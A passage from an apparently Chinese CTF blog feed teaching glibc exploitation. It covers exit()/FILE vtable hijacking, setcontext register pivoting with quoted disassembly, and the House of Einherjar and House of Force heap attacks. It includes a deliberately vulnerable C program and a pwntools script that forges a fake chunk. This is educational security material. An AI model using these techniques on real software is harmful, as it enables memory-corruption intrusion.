onegadget)</span><br></pre></td></tr></table></figure><p>就可以在exit()时触发</p><h3 id="0x5exit-与FILE"><a href="#0x5exit-与FILE" class="headerlink" title="0x5exit()与FILE"></a>0x5exit()与FILE</h3><p>一开始的run_exit_handlers么, 在遍历完exit_funcs链表后, 还有最后一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">  RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure><p>__libc_atexit其实<strong>是libc中的一个段</strong></p><p><strong>这个段中就是libc退出时的析构函数</strong></p><p><strong>其中默认只有一个函数fcloseall()</strong></p><p>这个函数会调用<strong>_IO_cleanup()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 关闭所有流.  */</span></span><br><span class="line"><span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_IO_cleanup()会调用两个函数</strong></p><ul><li><strong>_IO_flush_all_lockp()会通过_IO_list_all遍历所有流, 对每个流调用_IO_OVERFLOW(fp), 保证关闭前缓冲器中没有数据残留</strong></li><li><strong>_IO_unbuffer_all()会通过_IO_list_all遍历所有流, 对每个流调用_IO_SETBUF(fp, NULL, 0)即无缓冲模式, 来释放流的缓冲区</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_cleanup(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 刷新所有流 */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 关闭所有流的缓冲区 */</span></span><br><span class="line">  _IO_unbuffer_all();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment"> stream.  */</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">      freeres_list = fp;</span><br><span class="line">      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment"> used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现攻击点:</p><ol><li><p>libc2.23以前三个标准流的vtable是可写的,可以修改函数指针</p></li><li><p>之后的版本因为位于libc段中的vtable是无法写入的,故可以选择伪造vtable中的setbuf或overflow(其中overflow需要达到一些条件)函数,来达到getshell</p></li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2018hctf-the-end"><a href="#2018hctf-the-end" class="headerlink" title="2018hctf-the_end"></a>2018hctf-the_end</h2><p>这道题有两种解法，但都是利用exit函数</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exit </tag>
            
            <tag> pwn技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn技巧-setcontext</title>
      <link href="/posts/36187/"/>
      <url>/posts/36187/</url>
      
        <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><p>setcontext是libc中的一个函数</p><p><strong>2.27版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000052050                               ; __int64 __fastcall setcontext(__int64)</span><br><span class="line">.text:0000000000052050                               public setcontext ; weak</span><br><span class="line">.text:0000000000052050                               setcontext proc near                    ; CODE XREF: sub_58680+C↓p</span><br><span class="line">.text:0000000000052050                                                                       ; DATA XREF: LOAD:0000000000009058↑o</span><br><span class="line">.text:0000000000052050                               ; __unwind &#123;</span><br><span class="line">.text:0000000000052050 57                            push    rdi</span><br><span class="line">.text:0000000000052051 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000052058 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:000000000005205A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:000000000005205F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000052065 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:000000000005206A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:000000000005206C 5F                            pop     rdi</span><br><span class="line">.text:000000000005206D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000052073 73 5B                         jnb     short loc_520D0</span><br><span class="line">.text:0000000000052073</span><br><span class="line">.text:0000000000052075 48 8B 8F E0 00 00 00          mov     rcx, [rdi+0E0h]</span><br><span class="line">.text:000000000005207C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:000000000005207E 0F AE 97 C0 01 00 00          ldmxcsr dword ptr [rdi+1C0h]</span><br><span class="line">.text:0000000000052085 48 8B A7 A0 00 00 00          mov     rsp, [rdi+0A0h]</span><br><span class="line">.text:000000000005208C 48 8B 9F 80 00 00 00          mov     rbx, [rdi+80h]</span><br><span class="line">.text:0000000000052093 48 8B 6F 78                   mov     rbp, [rdi+78h]</span><br><span class="line">.text:0000000000052097 4C 8B 67 48                   mov     r12, [rdi+48h]</span><br><span class="line">.text:000000000005209B 4C 8B 6F 50                   mov     r13, [rdi+50h]</span><br><span class="line">.text:000000000005209F 4C 8B 77 58                   mov     r14, [rdi+58h]</span><br><span class="line">.text:00000000000520A3 4C 8B 7F 60                   mov     r15, [rdi+60h]</span><br><span class="line">.text:00000000000520A7 48 8B 8F A8 00 00 00          mov     rcx, [rdi+0A8h]</span><br><span class="line">.text:00000000000520AE 51                            push    rcx</span><br><span class="line">.text:00000000000520AF 48 8B 77 70                   mov     rsi, [rdi+70h]</span><br><span class="line">.text:00000000000520B3 48 8B 97 88 00 00 00          mov     rdx, [rdi+88h]</span><br><span class="line">.text:00000000000520BA 48 8B 8F 98 00 00 00          mov     rcx, [rdi+98h]</span><br><span class="line">.text:00000000000520C1 4C 8B 47 28                   mov     r8, [rdi+28h]</span><br><span class="line">.text:00000000000520C5 4C 8B 4F 30                   mov     r9, [rdi+30h]</span><br><span class="line">.text:00000000000520C9 48 8B 7F 68                   mov     rdi, [rdi+68h]</span><br><span class="line">.text:00000000000520C9                               ; &#125; // starts at 52050</span><br><span class="line">.text:00000000000520CD                               ; __unwind &#123;</span><br><span class="line">.text:00000000000520CD 31 C0                         xor     eax, eax</span><br><span class="line">.text:00000000000520CF C3                            retn</span><br></pre></td></tr></table></figure><p><strong>2.29版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000055E00                               public setcontext ; weak</span><br><span class="line">.text:0000000000055E00                               setcontext proc near                    ; CODE XREF: sub_5C160+C↓p</span><br><span class="line">.text:0000000000055E00                                                                       ; DATA XREF: LOAD:000000000000C6D8↑o</span><br><span class="line">.text:0000000000055E00                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E00 57                            push    rdi</span><br><span class="line">.text:0000000000055E01 48 8D B7 28 01 00 00          lea     rsi, [rdi+128h]                 ; nset</span><br><span class="line">.text:0000000000055E08 31 D2                         xor     edx, edx                        ; oset</span><br><span class="line">.text:0000000000055E0A BF 02 00 00 00                mov     edi, 2                          ; how</span><br><span class="line">.text:0000000000055E0F 41 BA 08 00 00 00             mov     r10d, 8                         ; sigsetsize</span><br><span class="line">.text:0000000000055E15 B8 0E 00 00 00                mov     eax, 0Eh</span><br><span class="line">.text:0000000000055E1A 0F 05                         syscall                                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:0000000000055E1C 5A                            pop     rdx</span><br><span class="line">.text:0000000000055E1D 48 3D 01 F0 FF FF             cmp     rax, 0FFFFFFFFFFFFF001h</span><br><span class="line">.text:0000000000055E23 73 5B                         jnb     short loc_55E80</span><br><span class="line">.text:0000000000055E23</span><br><span class="line">.text:0000000000055E25 48 8B 8A E0 00 00 00          mov     rcx, [rdx+0E0h]</span><br><span class="line">.text:0000000000055E2C D9 21                         fldenv  byte ptr [rcx]</span><br><span class="line">.text:0000000000055E2E 0F AE 92 C0 01 00 00          ldmxcsr dword ptr [rdx+1C0h]</span><br><span class="line">.text:0000000000055E35 48 8B A2 A0 00 00 00          mov     rsp, [rdx+0A0h]</span><br><span class="line">.text:0000000000055E3C 48 8B 9A 80 00 00 00          mov     rbx, [rdx+80h]</span><br><span class="line">.text:0000000000055E43 48 8B 6A 78                   mov     rbp, [rdx+78h]</span><br><span class="line">.text:0000000000055E47 4C 8B 62 48                   mov     r12, [rdx+48h]</span><br><span class="line">.text:0000000000055E4B 4C 8B 6A 50                   mov     r13, [rdx+50h]</span><br><span class="line">.text:0000000000055E4F 4C 8B 72 58                   mov     r14, [rdx+58h]</span><br><span class="line">.text:0000000000055E53 4C 8B 7A 60                   mov     r15, [rdx+60h]</span><br><span class="line">.text:0000000000055E57 48 8B 8A A8 00 00 00          mov     rcx, [rdx+0A8h]</span><br><span class="line">.text:0000000000055E5E 51                            push    rcx</span><br><span class="line">.text:0000000000055E5F 48 8B 72 70                   mov     rsi, [rdx+70h]</span><br><span class="line">.text:0000000000055E63 48 8B 7A 68                   mov     rdi, [rdx+68h]</span><br><span class="line">.text:0000000000055E67 48 8B 8A 98 00 00 00          mov     rcx, [rdx+98h]</span><br><span class="line">.text:0000000000055E6E 4C 8B 42 28                   mov     r8, [rdx+28h]</span><br><span class="line">.text:0000000000055E72 4C 8B 4A 30                   mov     r9, [rdx+30h]</span><br><span class="line">.text:0000000000055E76 48 8B 92 88 00 00 00          mov     rdx, [rdx+88h]</span><br><span class="line">.text:0000000000055E76                               ; &#125; // starts at 55E00</span><br><span class="line">.text:0000000000055E7D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000055E7D 31 C0                         xor     eax, eax</span><br><span class="line">.text:0000000000055E7F C3                            retn</span><br></pre></td></tr></table></figure><hr><p>不难看出利用的核心是rdi(2.29以前)和rdx(2.29及以后)</p><p>要从特定位置:<code>mov rsp , [??]</code>开始执行</p><p>需要从特定位置开始是因为上面的代码会使程序crash</p><p>程序控制了除rax以外的几乎所有寄存器,</p><p>其中rip是通过以下代码控制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     rcx, [rdi/rdx+0A8h]</span><br><span class="line">push    rcx</span><br><span class="line">....</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>唯一不可控的rax也在 <code>xor   eax, eax</code>的作用下变为<strong>零</strong></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h2><p>2.29以下的利用要更为简单一些</p><p>大部分题目中通过控制 rsp 和 rip 就可以很好地解决堆题不方便直接控制程序的执行流的问题。我们通常是吧 setcontext + 53 写进 <strong>free_hook 或者 </strong>malloc_hook 中，然后建立或者释放一个堆块，特别释放时 rdi 就会是该堆块的 chunk 头，那如果我们提前布局好堆，就意味着我们可以控制寄存器并劫持程序的执行流。</p><h2 id="2-29及以上"><a href="#2-29及以上" class="headerlink" title="2.29及以上"></a>2.29及以上</h2><p>2.29 最大的变动就是 setcontext 里控制寄存器由 rdi 变成了 rdx，这就使得我们无法通过直接控制 free 的堆块来控制寄存器。所以要用到一些 gadget 来把 rdi 和 rdx 转换一下。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn技巧 </tag>
            
            <tag> setcontext </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-4</title>
      <link href="/posts/60497/"/>
      <url>/posts/60497/</url>
      
        <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p><p>如果可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p><h2 id="后向合并"><a href="#后向合并" class="headerlink" title="后向合并"></a>后向合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));<span class="comment">//presize是有符号数,因此若其是负数则可以往高地址伪造chunk</span></span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击过程示例"><a href="#攻击过程示例" class="headerlink" title="攻击过程示例"></a>攻击过程示例</h3><p>可以进行 House Of Einherjar 攻击的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char* s0 = malloc(0x200);　//构造fake chunk</span><br><span class="line">    char* s1 = malloc(0x18);</span><br><span class="line">    char* s2 = malloc(0xf0);　</span><br><span class="line">    char* s3 = malloc(0x20); //为了不让s2与top chunk 合并</span><br><span class="line">    printf(&quot;begin\n&quot;);</span><br><span class="line">    printf(&quot;%p\n&quot;, s0);</span><br><span class="line">    printf(&quot;input s0\n&quot;);</span><br><span class="line">    read(0, s0, 0x200); //读入fake chunk</span><br><span class="line">    printf(&quot;input s1\n&quot;);</span><br><span class="line">    read(0, s1, 0x19); //Off By One</span><br><span class="line">    free(s2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./example&quot;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&quot;begin\n&quot;)</span><br><span class="line">address = int(p.recvline().strip(), 16)</span><br><span class="line">p.recvuntil(&quot;input s0\n&quot;)</span><br><span class="line">payload = p64(0) + p64(0x101) + p64(address) * 2 + &quot;A&quot;*0xe0    #这个101大小可能会让人困惑下面解释</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p64(address) * 2是为了绕过</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload += p64(0x100) #fake size</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;input s1\n&quot;)</span><br><span class="line">payload = &quot;A&quot;*0x10 + p64(0x220) + &quot;\x00&quot; #220使指针刚好到s0的mem指针,以使用fakechunk</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p><strong>注意这里绕过 unlink 检查的方法跟之前利用 unlink 漏洞时采用的方法不一样</strong></p><p>利用 unlink 漏洞的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = &amp;p-3*4</span><br><span class="line">p-&gt;bk = &amp;p-2*4</span><br></pre></td></tr></table></figure><p>在这里利用时，因为无法得到 <code>&amp;p</code> , 所以直接让：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure><p><strong>这里需要注意一个点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) + p64(0x101) + p64(address) * 2 + &quot;A&quot;*0xe0</span><br></pre></td></tr></table></figure><p>其实修改为下面这样也是可以的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) + p64(0x221) + p64(address) * 2 + &quot;A&quot;*0xe0</span><br></pre></td></tr></table></figure><p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code> 才合理，但是为什么 <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br></pre></td></tr></table></figure><p>也就是说在合并完后,进行size和nextchunk_size的比较时,nextchunk是通过p指针与size来获得的,因此不是去与s2中的size比较了</p><p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里我们总结下这个利用技术需要注意的地方</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><p>其实，该技术与 chunk extend/shrink 技术比较类似,不同的是后者只能在堆块中实现,而前者只要有偏移可以在任意地址实现</p><h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>利用的是top_chunk的切割机制</p><p>只要通过request2size验证可以达到在任意地址分配chunk</p><p>HOF 的利用要求还是相当苛刻的。</p><ul><li>首先，需要存在漏洞使得用户能够<strong>控制 top chunk 的 size 域。</strong></li><li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li><li>第三，分配的次数不能受限制</li></ul><p>其实这三点中第二点往往是最难办的，CTF 